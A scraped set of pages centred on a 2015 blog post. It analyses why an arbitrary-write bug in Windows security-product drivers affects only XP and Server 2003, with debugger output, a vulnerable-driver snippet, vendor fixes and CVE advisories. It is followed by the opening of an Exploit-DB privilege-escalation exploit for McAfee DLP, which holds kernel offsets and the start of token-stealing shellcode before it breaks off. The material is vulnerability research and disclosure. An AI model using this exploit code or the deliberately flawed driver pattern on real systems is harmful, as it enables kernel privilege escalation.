=== Content from kc.mcafee.com_90917981_20250126_101551.html ===
Loading×Sorry to interruptCSS ErrorRefresh

=== Content from www.greyhathacker.net_8c398007_20250125_162557.html ===


[GreyHatHacker.NET](https://www.greyhathacker.net/ "GreyHatHacker.NET")

Malware, Vulnerabilities, Exploits and more . . .

#### Menu

* [About](https://www.greyhathacker.net/?page_id=13)

Search for:

# Analysis Of An Interesting Windows Kernel Change Mitigating Vulnerabilities In Some Security Products

Last year I started researching into the Windows kernel to get a better understanding of privilege escalation vulnerabilities. Vulnerabilities in the kernel are a serious issue as they could be used to bypass browsers sandboxes and end up compromising the entire system. In general most people assume that security products are developed with security in mind and can be trusted, so I thought I would start my assessment on security products and see how secure they really are from kernel attacks.  Within a couple of months of research six vulnerabilities had already been discovered in various products from different vendors. What was particularly interesting is that they all exhibited the same type of vulnerability, which only seemed to exist on older operating systems.

This blog post details the technical research carried out in order to pinpoint the root cause as to what had changed from Windows XP and Windows Server 2003 to later Windows operating systems.

**The vulnerability**

The vulnerability exists when drivers do not validate the output buffer address and output buffer size. Applications wanting to talk to the kernel communicate through the use of the **DeviceIOControl** function.

```
DeviceIoControl(hDevice, 0x00222000, inbuffer, BUFSIZE, (LPVOID)0xF4F5F6F7, 0, &dwRetBytes, NULL);
```

In this example we can see two things of interest, first is that using LPVOID we can send in a hardcoded output buffer address and second is the output buffer length has been defined to 0. Sending this to a vulnerable driver will trigger a bugcheck.

**Debugger Output**

In the bugcheck analysis below the write address is the same as passed through the DeviceIOControl function, which basically means we have found an arbitrary memory overwrite vulnerability. If we look at the call stack, the bugcheck was triggered in function nt!IopCompleteRequest

```
kd> !analyze -v
***************************************************************************
*                                                                         *
*                        Bugcheck Analysis                                *
*                                                                         *
***************************************************************************

PAGE_FAULT_IN_NONPAGED_AREA (50)
Invalid system memory was referenced.  This cannot be protected by try-except,
it must be protected by a Probe.  Typically the address is just plain bad or it
is pointing at freed memory.
Arguments:
Arg1: f4f5f6f7, memory referenced.
Arg2: 00000001, value 0 = read operation, 1 = write operation.
Arg3: 804ec09b, If non-zero, the instruction address which referenced the bad memory
	address.
Arg4: 00000000, (reserved)

Debugging Details:
------------------

Could not read faulting driver name

WRITE_ADDRESS:  f4f5f6f7

FAULTING_IP:
nt!IopCompleteRequest+92
804ec09b f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

MM_INTERNAL_CODE:  0

CUSTOMER_CRASH_COUNT:  1

DEFAULT_BUCKET_ID:  DRIVER_FAULT

BUGCHECK_STR:  0x50

PROCESS_NAME:  dos_greyhat.exe

IRP_ADDRESS:  86593dd8

DEVICE_OBJECT: 866e10f0

LAST_CONTROL_TRANSFER:  from 804ec11a to 804ec09b

STACK_TEXT:
f411baec 804ec11a 86593e18 f411bb38 f411bb2c nt!IopCompleteRequest+0x92
f411bb3c 806f5c0e 00000000 00000000 f411bb54 nt!KiDeliverApc+0xb3
f411bb3c 806f00b3 00000000 00000000 f411bb54 hal!HalpApcInterrupt2ndEntry+0x31
f411bbc8 804e53cc 86593e18 86593dd8 00000000 hal!KfLowerIrql+0x43
f411bbe8 804ec134 86593e18 8659f3e0 00000000 nt!KeInsertQueueApc+0x4b
f411bc1c f7e99562 8659f3e0 86594390 86593dd8 nt!IopfCompleteRequest+0x1d8
WARNING: Stack unwind information not available. Following frames may be wrong.
f411bc34 804e3767 866e10f0 867cf288 806f0070 ghhpoc+0x562
f411bc44 805682ab 86593e48 8659f3e0 86593dd8 nt!IopfCallDriver+0x31
f411bc58 805771e2 866e10f0 86593dd8 8659f3e0 nt!IopSynchronousServiceTail+0x70
f411bd00 80579705 000007e8 00000000 00000000 nt!IopXxxControlFile+0x611
f411bd34 804de7f8 000007e8 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
f411bd34 7c90e514 000007e8 00000000 00000000 nt!KiSystemServicePostCall
0012fe3c 00000000 00000000 00000000 00000000 0x7c90e514

STACK_COMMAND:  kb

FOLLOWUP_IP:
ghhpoc+562
f7e99562 ??              ???

SYMBOL_STACK_INDEX:  6

SYMBOL_NAME:  ghhpoc+562

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: ghhpoc

IMAGE_NAME:  ghhpoc.sys

DEBUG_FLR_IMAGE_TIMESTAMP:  54b18dfe

FAILURE_BUCKET_ID:  0x50_ghhpoc+562

BUCKET_ID:  0x50_ghhpoc+562

Followup: MachineOwner
---------

kd> r
eax=00000008 ebx=86593dd8 ecx=00000002 edx=00000000 esi=867cf288 edi=f4f5f6f7
eip=804ec09b esp=f411baa8 ebp=f411baec iopl=0         nv up ei pl nz na po nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202
nt!IopCompleteRequest+0x92:
804ec09b f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

```

**Vulnerable Driver Analysis**

Reverse engineering the driver the bugcheck is triggered after the call of the function **IofCompleteRequest**.

![](/images/iocompleterequestdemo.png)

The **IoCompleteRequest** function indicates that the driver has completed all processing for a given IRP and is returning the IRP back to the I/O manager. IRP is an I/O request packet and is how Windows communicates with drivers. The IRP data structure contains information used by drivers.

**Comparing IRP data**

Since the goal was to find the root cause as to why this vulnerability only applies to older versions of Windows, I started comparing Windows XP to Windows 7. Setting a breakpoint before our call to the IoCompleteRequest function and looking at the IRP data in WinDbg, we can see UserBuffer contains the address of our output buffer address. One noticeable change was the “Flags” value. Windows XP had a value of 0x70 whereas Windows 7 had a value of 0x60030

In Windows XP ebx contains pointer to IRP

```
kd> dt nt!_irp @ebx
   +0x000 Type             : 6
   +0x002 Size             : 0x94
   +0x004 MdlAddress       : (null)
   +0x008 Flags            : 0x70
   +0x00c AssociatedIrp    : __unnamed
   +0x010 ThreadListEntry  : _LIST_ENTRY [ 0x8650dfb0 - 0x8650dfb0 ]
   +0x018 IoStatus         : _IO_STATUS_BLOCK
   +0x020 RequestorMode    : 1 ''
   +0x021 PendingReturned  : 0 ''
   +0x022 StackCount       : 1 ''
   +0x023 CurrentLocation  : 3 ''
   +0x024 Cancel           : 0 ''
   +0x025 CancelIrql       : 0 ''
   +0x026 ApcEnvironment   : 0 ''
   +0x027 AllocationFlags  : 0xc ''
   +0x028 UserIosb         : 0x0012fe18 _IO_STATUS_BLOCK
   +0x02c UserEvent        : (null)
   +0x030 Overlay          : __unnamed
   +0x038 CancelRoutine    : (null)
   +0x03c UserBuffer       : 0xf4f5f6f7
   +0x040 Tail             : __unnamed
```

In Windows 7 esi contains pointer to IRP

```
kd> dt nt!_irp @esi
   +0x000 Type             : 6
   +0x002 Size             : 0x94
   +0x004 MdlAddress       : (null)
   +0x008 Flags            : 0x60030
   +0x00c AssociatedIrp    : <unnamed-tag>
   +0x010 ThreadListEntry  : _LIST_ENTRY [ 0x85257f94 - 0x85257f94 ]
   +0x018 IoStatus         : _IO_STATUS_BLOCK
   +0x020 RequestorMode    : 1 ''
   +0x021 PendingReturned  : 0 ''
   +0x022 StackCount       : 1 ''
   +0x023 CurrentLocation  : 3 ''
   +0x024 Cancel           : 0 ''
   +0x025 CancelIrql       : 0 ''
   +0x026 ApcEnvironment   : 0 ''
   +0x027 AllocationFlags  : 0x6 ''
   +0x028 UserIosb         : 0x0023f7b8 _IO_STATUS_BLOCK
   +0x02c UserEvent        : (null)
   +0x030 Overlay          : <unnamed-tag>
   +0x038 CancelRoutine    : (null)
   +0x03c UserBuffer       : 0xf4f5f6f7
   +0x040 Tail             : <unnamed-tag>
```

**IoCompleteRequest Analysis**

The exported function IoCompleteRequest in **ntoskrnl.exe** ends up calling IopCompleteRequest function. We can see on Windows XP that it does a bitwise 40 AND 70 and jumps to the inlined memcpy code which ends up triggering the bugcheck.

![](/images/iopcompleterequestxp.png)

On Windows 7 we see the bitwise 40 AND 30 takes a different codepath and never hits our memcpy.

![](/images/iopcompleterequestw7.png)

The “test al, 40h” instruction on Windows 7 branches off to another codepath as its doing a bitwise 40 AND 30 instead of bitwise 40 AND 70 as al=30h on Windows 7 which is from the IRP flags value.

**IopXxxControlFile Analysis**

“So what causes the flags value to be 30h instead of 70h?” was my next question. After some investigation I discovered that **IopXxxControlFile** held the answer. The IopXxxControlFile function had been called earlier in our call stack. This function does a number of checks and validations on the inputs provided such as if addresses are in user space, buffer lengths, etc. and sets up our data in IRP.

In this function near the beginning it calls the **ProbeForWrite** function which checks if the address falls in the user space range and writable. The first thing the function does though is check the output buffer length, if zero it returns back to the IopXxxControlFile function without even checking the output buffer address. The ProbeForWrite function below is from Windows XP but is also the same for Windows 7.

[![](/images/probeforwritexp.png)](/images/probeforwritexp.png)

Returning back to the IopXxxControlFile function and after a number of checks near the end of the code we see our output buffer address being placed in the IRP UserBuffer field and Flags value being updated to 0x70, all it checks on Windows XP if an output buffer address is available.

![](/images/iopxxxcontrolfilexp.png)

On Windows 7 we finally discover the root cause as to what has changed in the IopXxxControlFile function. It checks the output buffer length instead of the output buffer address. Since the output buffer length is 0 the flags value does not get set to 0x70 thus mitigating the vulnerability.

![](/images/iopxxxcontrolfilew7.png)

**What do these flags values mean?**

So what do these values 10h, 30h, 40h and 70h represent? Searching through wdm.h header file I found these definitions:

```
#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040
```

The values are set in IopXxxControlFile function by performing an OR operation. So doing an OR on IRP\_BUFFERED\_IO | IRP\_DEALLOCATE\_BUFFER produces a value of 30h

Converting into code it will look something like this

```
// Windows XP
Irp->Flags = IRP_BUFFERED_IO | IRP_DEALLOCATE_BUFFER;
Irp->UserBuffer = pBufferOut;
if (pBufferOut)
  Irp->Flags = IRP_BUFFERED_IO | IRP_DEALLOCATE_BUFFER | IRP_INPUT_OPERATION;
```
```
// Windows 7
Irp->Flags = IRP_BUFFERED_IO | IRP_DEALLOCATE_BUFFER;
Irp->UserBuffer = pBufferOut;
if (iBufferOutSize)
  Irp->Flags = IRP_BUFFERED_IO | IRP_DEALLOCATE_BUFFER | IRP_INPUT_OPERATION;
```

When it comes to carry its memcpy operation in IoCompleteRequest function it will look something like this

```
if (Irp->Flags & IRP_BUFFERED_IO)
{
  if ((Irp->Flags & IRP_INPUT_OPERATION)
     &&  (Irp->IoStatus.Status != STATUS_VERIFY_REQUIRED)
     && !(NT_ERROR(Irp->IoStatus.Status)))
  {
       RtlCopyMemory(Irp->UserBuffer, Irp->AssociatedIrp.SystemBuffer, Irp->IoStatus.Information);
  }
}
```

Here is it does its bitwise AND operation and dictates its outcome, jump or not to jump.

**Conditions of a Vulnerable Driver**

During completion of an IRP the I/O Manager copies the data from the system buffer back to the user’s output buffer if using Buffered I/O method (METHOD\_BUFFERED) and the status is of a success or warning. The number of bytes to copy is taken from the Irp->IoStatus.Information field.

The following range values indicate error and warning status codes:

*NTSTATUS codes 0xC0000000 – 0xFFFFFFFF are errors*

*NTSTATUS codes 0x80000000 – 0xBFFFFFFF are warnings*

In the above code we can see it uses the macro NT\_ERROR() to evaluate if not an error status.

So if the data is too large for the buffer, the driver completes the IRP with a status STATUS\_BUFFER\_OVERFLOW (0x80000005), which falls in the warning range, and the Irp->IoStatus.Information will be updated with the buffer size and data copied over. If completed with status STATUS\_BUFFER\_TOO\_SMALL (0xC0000023) which falls in the error range, the I/O Manager does not copy any data back to the output buffer as it sets the Irp->IoStatus.Information to 0.

To reproduce a vulnerable driver for testing purposes use this code in your dispatch routine for Buffered I/O. The IoStatus.Information value has to be 1 or more for an overwrite to take place.

```
Irp->IoStatus.Information = 4;
Irp->IoStatus.Status = STATUS_SUCCESS;
IoCompleteRequest(Irp, IO_NO_INCREMENT);
```

Windows supports three I/O transfer methods, which the driver developer can use for reading and writing data to memory. One method being Buffered I/O where the I/O Manager allocates a system buffer of equal size to the users inputted buffer. For write operations, the I/O manager copies the user’s buffer data into the system buffer. For read operations, the I/O manager copies data from the system buffer to the users output buffer when the IRP completes and then frees the system buffer. Buffered I/O is defined in the driver for example like this

```
CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
```

So when using METHOD\_BUFFERED it copies our system data back to our UserBuffer address when IRP is completed using the IoCompleteRequest function.

**Fixing a Vulnerable Driver**

Asking the same question to all the vendors on how they each fixed the issue it was interesting to find different approaches had been taken. One approach was

to check if the output buffer address was in the user space

```
if (Irp->UserBuffer > MmHighestUserAddress)
{
    ntStatus = STATUS_INVALID_PARAMETER;
}
```

Another approach was to check the size of the output buffer

```
if (iBufferOutSize < sizeof(ULONG))
{
    ntStatus = STATUS_INVALID_BUFFER_SIZE;
}
```

Depending on the dispatch conditions just by changing the status value to an error status is enough to resolve the vulnerability.

I would like to thank BullGuard, AVG and K7 Computing for kindly sharing information. A special thanks to [BullGuard](http://www.bullguard.com) as they were very helpful and provided a lot more important information which saved me a lot of time on this research. I can’t say the same for the other three vendors: McAfee, Symantec and TrendMicro. All three decided not to share anything; do you see anything confidential in the above code?

**Published Advisories**

This table below provides information on the products where this vulnerability had been discovered.

| **Vendor** | **Product** | **OSVDB** | **CVE ID** | **Days** | **Vendor link** |
| --- | --- | --- | --- | --- | --- |
| McAfee | Data Loss Prevention | [117345](http://www.osvdb.org/show/osvdb/117345) | CVE-2015-1305 | 99 | [Advisory](https://kc.mcafee.com/corporate/index?page=content&id=SB10097) |
| Trend Micro | Antivirus Plus Internet Security Maximum Security | [115514](http://www.osvdb.org/show/osvdb/115514) | CVE-2014-9641 | 70 | [Advisory](http://esupport.trendmicro.com/solution/en-US/1106233.aspx) |
| Symantec | Altiris Client | [116082](http://www.osvdb.org/show/osvdb/116082) | CVE-2014-7286 | 59 | [Advisory](http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20141219_00) |
| AVG | Internet Security | [113824](http://www.osvdb.org/show/osvdb/113824) | CVE-2014-9632 | 26 | [Release notes](http://www.avg.com/eu-en/avg-release-notes) |
| K7 Computing | Ultimate Security Anti-Virus Plus Total Security | [113007](http://www.osvdb.org/show/osvdb/113007) | CVE-2014-9643 | 22 | None |
| BullGuard | Antivirus Internet Security Premium Protection Online Backup | [114478](http://www.osvdb.org/show/osvdb/114478) | CVE-2014-9642 | 16 | [Release notes](http://www.bullguard.com/about/release-notes.aspx) |

Advisories published by some vendors were very unprofessional. Trend Micro had to be advised to correct their description, as they didn’t get it right the first time since it had a number of mistakes and was initially published without consultation. Also the fix applies all the way to Trend Titanium products 2015, which was stated in my vulnerability report but not mentioned in their advisory.

For Symantec, well they are not any better. After waiting nearly two months they ended up releasing an advisory advising only to uninstall the driver. Also, their advisory link in their mitigation information section refers to a knowledge base article [DOC7993](http://www.symantec.com/business/support/index?page=content&id=DOC7993) on how to remove the driver. However, if you take a look as this article it starts off mentioning the MQAC.sys driver and points to a Microsoft link. I had this flagged at the time but no action has been taken. It’s a similar vulnerability so they must have just copied and pasted it without reading it.

What is really shocking is that McAfee took 99 days to release an advisory to the public whereas BullGuard took only 16 days. Does that mean if an exploit was made public we would have had to wait 99 days for an update? Also, McAfee failed to mention in their advisory that it also affects Windows Server 2003, which was clearly stated in my vulnerability report as the product is supported on Windows Server 2003. I however did not test it on Windows Server 2003 R2 (32bit) but did reverse engineer ntoskrnl.exe from Windows Server 2003 R2 (64bit) and did have only the address check in the IopXxxControlFile function. There is a 64bit version for McAfee DLP so should be exploitable too.

**Other Vendors**

Assessment carried out on some of the security vendors’ products that were not affected from this type of vulnerability are listed below. This is no way an assurance that their products are free from this vulnerability, as there is a possibility some ioctls may have been missed, input buffer sizes may have changed the codepath, device handles not loaded, etc.

* Agnitum
* AhnLab
* Avast
* Avira
* BitDefender
* ClamAV
* Comodo
* Emsisoft
* Eset
* Fortinet
* FRISK Software
* F-Secure
* G Data
* Kaspersky Lab
* Kingsoft
* Malwarebytes
* Nano Security
* Norman
* Panda Security
* Sophos
* TrustPort
* ThreatTrack Security
* Webroot
* Zemana

**Other Windows Versions**

Since all my tests were on a fully patched Windows XP SP3 32bit and Windows 7 SP1 32bit I thought I’d check some other operating systems. Checking on Windows Server 2003 SP2 Standard Edition 32bit found to have the same issue as Windows XP and during tests exploited successfully. Windows Server 2003 has still got over 5 months before the end-of-life so for those of you still using Windows 2003 better upgrade to a later operating system if you’ve not already done so.

On a clean default installation of Windows Vista 32bit in an unpatched state the output buffer length check had been applied like Windows 7. This means Microsoft did know about this issue and added the check before release.

There are plenty of products designed only to run on Windows Servers, which I have not audited, so maybe it’s a good time for researchers to discover some low-hanging fruit.

**Final thoughts**

One thing is clear from this research and working with vendors: Just because it’s a big company doesn’t mean you’ll get great service. There are plenty of other vendors doing an excellent job so we should not blindly need to go with the likes of McAfee, Symantec or Trend Micro.

Updating machines is a tedious job at times so really we should be focusing on mitigation products like Microsoft EMET and MalwareBytes Anti-Exploit and not be so dependent on constantly updating machines for security. Bottom line is to upgrade to the latest operating systems as it will have a number of mitigations, checks, validations in place that we probably don’t even know about yet keeping us safe.

*I’ll start submitting the exploits to Exploit-DB in the next few days and tweet you all once published.*

**References**[http://msdn.microsoft.com/en-us/library/ff550694(v=VS.85).aspx](http://msdn.microsoft.com/en-us/library/ff550694%28v%3DVS.85%29.aspx)

<http://msdn.microsoft.com/en-gb/library/cc704588.aspx>

<http://msdn.microsoft.com/en-us/library/ff545693.aspx>

[http://msdn.microsoft.com/en-us/library/windows/hardware/ff548649(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/hardware/ff548649%28v%3Dvs.85%29.aspx)

<http://doxygen.reactos.org/d6/dfc/ntoskrnl_2io_2iomgr_2irp_8c_source.html>

<http://www.cmlab.csie.ntu.edu.tw/~cathyp/eBooks/WindowsNT/Driver/IRPs.pdf>  [PDF]

<http://www.tutorialspoint.com/assembly_programming/assembly_logical_instructions.htm>

<http://blogs.msdn.com/b/doronh/archive/2006/12/12/how-to-return-the-number-of-bytes-required-for-a-subsequent-operation.aspx>

Posted in [All](https://www.greyhathacker.net/?cat=18), [Bugs](https://www.greyhathacker.net/?cat=8), [Exploits](https://www.greyhathacker.net/?cat=7), [Mitigation](https://www.greyhathacker.net/?cat=40), [Vulnerabilities](https://www.greyhathacker.net/?cat=6) and tagged [Elevate](https://www.greyhathacker.net/?tag=elevate), [Kernel](https://www.greyhathacker.net/?tag=kernel) on [January 28, 2015](https://www.greyhathacker.net/?p=818 "3:01 pm") by [Parvez](https://www.greyhathacker.net/?author=1 "View all posts by Parvez"). [2 Comments](https://www.greyhathacker.net/?p=818#comments)

[← Bypassing Windows User Account Control (UAC) and ways of mitigation](https://www.greyhathacker.net/?p=796) [Detecting Malicious Microsoft Office Macro Documents →](https://www.greyhathacker.net/?p=872)

### 2 comments

1. ![](https://secure.gravatar.com/avatar/526df9c04a40cf5188b36120bc24eb0e?s=40&d=mm&r=g) **n3k** says:
   [August 12, 2015 at 9:51 pm](https://www.greyhathacker.net/?p=818#comment-9066)

   Hello there, I have a doubt regarding what you have described here.. you say the problem is when using buffered IO Method.. but here your example is using IRP->UserBuffer, which is only used if the method is NEITHER… and thats why you must not only the addresses but also the length of the data…

   When using buffered method, the IOManager do these checks for you on behalf… You will get an error if you call deviceIoControl for a buffered method IOCTL with an output buffer with that address.
3. ![](https://secure.gravatar.com/avatar/f6306376486bff7a746a72d6dd054e36?s=40&d=mm&r=g) **[Parvez](http://www.greyhathacker.net)** says:
   [August 13, 2015 at 10:04 am](https://www.greyhathacker.net/?p=818#comment-9072)

   This is what most think that IRP->UserBuffer is only used by NEITHER I/O method which is not true. BUFFERED method does do some checks as I’ve explained as you can see the lack of size validation in older OS’s bypasses the address validation. So using BUFFERED method you can write to the output userbuffer.

### Leave a Reply

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

#### Recent Posts

* [Dokany/Google Drive File Stream Kernel Stack-based Buffer Overflow Vulnerability](https://www.greyhathacker.net/?p=1041)
* [Exploiting STOPzilla AntiMalware Arbitrary Write Vulnerability using SeCreateTokenPrivilege](https://www.greyhathacker.net/?p=1025)
* [Exploiting System Shield AntiVirus Arbitrary Write Vulnerability using SeTakeOwnershipPrivilege](https://www.greyhathacker.net/?p=1006)
* [IKARUS anti.virus and its 9 exploitable kernel vulnerabilities](https://www.greyhathacker.net/?p=995)
* [Exploiting Vir.IT eXplorer Anti-Virus Arbitrary Write Vulnerability](https://www.greyhathacker.net/?p=990)
#### Categories

* [All](https://www.greyhathacker.net/?cat=18)
* [Bugs](https://www.greyhathacker.net/?cat=8)
* [Exploits](https://www.greyhathacker.net/?cat=7)
* [Malware](https://www.greyhathacker.net/?cat=5)
* [Mitigation](https://www.greyhathacker.net/?cat=40)
* [Other](https://www.greyhathacker.net/?cat=34)
* [Vulnerabilities](https://www.greyhathacker.net/?cat=6)
#### Tags

[ActionScript](https://www.greyhathacker.net/?tag=actionscript)
[ActiveX](https://www.greyhathacker.net/?tag=activex)
[Adobe](https://www.greyhathacker.net/?tag=adobe)
[Anti-Rootkit](https://www.greyhathacker.net/?tag=anti-rootkit)
[ASLR](https://www.greyhathacker.net/?tag=aslr)
[Autorun](https://www.greyhathacker.net/?tag=autorun)
[BHO](https://www.greyhathacker.net/?tag=bho)
[BlazeDVD](https://www.greyhathacker.net/?tag=blazedvd)
[Download and Execute](https://www.greyhathacker.net/?tag=download-and-execute)
[Elevate](https://www.greyhathacker.net/?tag=elevate)
[EMET](https://www.greyhathacker.net/?tag=emet)
[FakeAV](https://www.greyhathacker.net/?tag=fakeav)
[heapspray](https://www.greyhathacker.net/?tag=heapspray)
[Hidden](https://www.greyhathacker.net/?tag=hidden)
[Hijack](https://www.greyhathacker.net/?tag=hijack)
[IrfanView](https://www.greyhathacker.net/?tag=irfanview)
[Java](https://www.greyhathacker.net/?tag=java)
[Kernel](https://www.greyhathacker.net/?tag=kernel)
[Macros](https://www.greyhathacker.net/?tag=macros)
[McAfee](https://www.greyhathacker.net/?tag=mcafee)
[MSI](https://www.greyhathacker.net/?tag=msi)
[MSWord](https://www.greyhathacker.net/?tag=msword)
[PGP](https://www.greyhathacker.net/?tag=pgp)
[pif](https://www.greyhathacker.net/?tag=pif)
[RemoteExec](https://www.greyhathacker.net/?tag=remoteexec)
[Return to Libc](https://www.greyhathacker.net/?tag=return-to-libc)
[ROP](https://www.greyhathacker.net/?tag=rop)
[Sandbox](https://www.greyhathacker.net/?tag=sandbox)
[Skype](https://www.greyhathacker.net/?tag=skype)
[SureThing](https://www.greyhathacker.net/?tag=surething)
[Symantec](https://www.greyhathacker.net/?tag=symantec)
[trailing](https://www.greyhathacker.net/?tag=trailing)
[UAC](https://www.greyhathacker.net/?tag=uac)
[URI](https://www.greyhathacker.net/?tag=uri)
[Vista](https://www.greyhathacker.net/?tag=vista)
#### Archives

* [January 2019](https://www.greyhathacker.net/?m=201901) (1)
* [September 2018](https://www.greyhathacker.net/?m=201809) (1)
* [January 2018](https://www.greyhathacker.net/?m=201801) (1)
* [November 2017](https://www.greyhathacker.net/?m=201711) (2)
* [September 2016](https://www.greyhathacker.net/?m=201609) (1)
* [December 2015](https://www.greyhathacker.net/?m=201512) (2)
* [July 2015](https://www.greyhathacker.net/?m=201507) (1)
* [January 2015](https://www.greyhathacker.net/?m=201501) (1)
* [December 2014](https://www.greyhathacker.net/?m=201412) (1)
* [June 2014](https://www.greyhathacker.net/?m=201406) (1)
* [January 2014](https://www.greyhathacker.net/?m=201401) (1)
* [November 2013](https://www.greyhathacker.net/?m=201311) (1)
* [September 2013](https://www.greyhathacker.net/?m=201309) (1)
* [February 2013](https://www.greyhathacker.net/?m=201302) (1)
* [December 2012](https://www.greyhathacker.net/?m=201212) (1)
* [August 2012](https://www.greyhathacker.net/?m=201208) (1)
* [June 2012](https://www.greyhathacker.net/?m=201206) (1)
* [February 2012](https://www.greyhathacker.net/?m=201202) (1)
* [January 2012](https://www.greyhathacker.net/?m=201201) (1)
* [December 2011](https://www.greyhathacker.net/?m=201112) (1)
* [November 2011](https://www.greyhathacker.net/?m=201111) (1)
* [August 2011](https://www.greyhathacker.net/?m=201108) (2)
* [July 2011](https://www.greyhathacker.net/?m=201107) (1)
* [April 2011](https://www.greyhathacker.net/?m=201104) (1)
* [March 2011](https://www.greyhathacker.net/?m=201103) (1)
* [October 2010](https://www.greyhathacker.net/?m=201010) (3)
* [June 2010](https://www.greyhathacker.net/?m=201006) (1)
* [May 2010](https://www.greyhathacker.net/?m=201005) (1)
* [March 2010](https://www.greyhathacker.net/?m=201003) (2)
* [February 2010](https://www.greyhathacker.net/?m=201002) (1)
* [December 2009](https://www.greyhathacker.net/?m=200912) (1)
* [September 2009](https://www.greyhathacker.net/?m=200909) (1)
* [May 2009](https://www.greyhathacker.net/?m=200905) (1)
* [April 2009](https://www.greyhathacker.net/?m=200904) (1)
* [September 2008](https://www.greyhathacker.net/?m=200809) (1)
* [November 2007](https://www.greyhathacker.net/?m=200711) (2)
#### Meta

* [Log in](https://www.greyhathacker.net/wp-login.php)
* [Entries feed](https://www.greyhathacker.net/?feed=rss2)
* [Comments feed](https://www.greyhathacker.net/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

Proudly powered by [WordPress](http://wordpress.org/ "Semantic Personal Publishing Platform")  ·
Theme: Suits by [Theme Weaver](http://www.themeweaver.net/ "Theme Developer")



=== Content from packetstormsecurity.com_d97aab65_20250125_162555.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.exploit-db.com_ffbfdc18_20250125_162556.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# McAfee Data Loss Prevention Endpoint - Arbitrary Write Privilege Escalation

#### EDB-ID:

###### 35953

#### CVE:

###### [2015-1305](https://nvd.nist.gov/vuln/detail/CVE-2015-1305)

---

**EDB Verified:**

#### Author:

###### [Parvez Anwar](/?author=6706)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2015-01-30

---

**Vulnerable App:**

```
/*

Exploit Title    - McAfee Data Loss Prevention Endpoint Arbitrary Write Privilege Escalation
Date             - 29th January 2015
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - http://www.mcafee.com
Tested Version   - 9.3.200.23
Driver Version   - 9.3.200.23 - hdlpctrl.sys
Tested on OS     - 32bit Windows XP SP3 and Windows 2003 Server SP2
OSVDB            - http://www.osvdb.org/show/osvdb/117345
CVE ID           - CVE-2015-1305
Vendor fix url   - https://kc.mcafee.com/corporate/index?page=content&id=SB10097
Fixed version    - 9.3.400
Fixed driver ver -

*/

#include <stdio.h>
#include <windows.h>

#define BUFSIZE 4096

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
     PVOID   Unknown1;
     PVOID   Unknown2;
     PVOID   Base;
     ULONG   Size;
     ULONG   Flags;
     USHORT  Index;
     USHORT  NameLength;
     USHORT  LoadCount;
     USHORT  PathLength;
     CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
     ULONG   Count;
     SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
     SystemModuleInformation = 11,
     SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength);

typedef NTSTATUS (WINAPI *_NtQueryIntervalProfile)(
     DWORD ProfileSource,
     PULONG Interval);

typedef void (*FUNCTPTR)();

// Windows XP SP3

#define XP_KPROCESS 0x44      // Offset to _KPROCESS from a _ETHREAD struct
#define XP_TOKEN    0xc8      // Offset to TOKEN from the _EPROCESS struct
#define XP_UPID     0x84      // Offset to UniqueProcessId FROM the _EPROCESS struct
#define XP_APLINKS  0x88      // Offset to ActiveProcessLinks _EPROCESS struct

// Windows Server 2003

#define W2K3_KPROCESS 0x38      // Offset to _KPROCESS from a _ETHREAD struct
#define W2K3_TOKEN    0xd8      // Offset to TOKEN from the _EPROCESS struct
#define W2K3_UPID     0x94      // Offset to UniqueProcessId FROM the _EPROCESS struct
#define W2K3_APLINKS  0x98      // Offset to ActiveProcessLinks _EPROCESS struct

BYTE token_steal_xp[] =
{
  0x52,                                                  // push edx                       Save edx on the stack
  0x53,	                                                 // push ebx                       Save ebx on the stack
  0x33,0xc0,                                             // xor eax, eax                   eax = 0
  0x64,0x8b,0x80,0x24,0x01,0x00,0x00,                    // mov eax, fs:[eax+124h]         Retrieve ETHREAD
  0x8b,0x40,XP_KPROCESS,                                 // mov eax, [eax+XP_KPROCESS]     Retrieve _KPROCESS
  0x8b,0xc8,                                             // mov ecx, eax
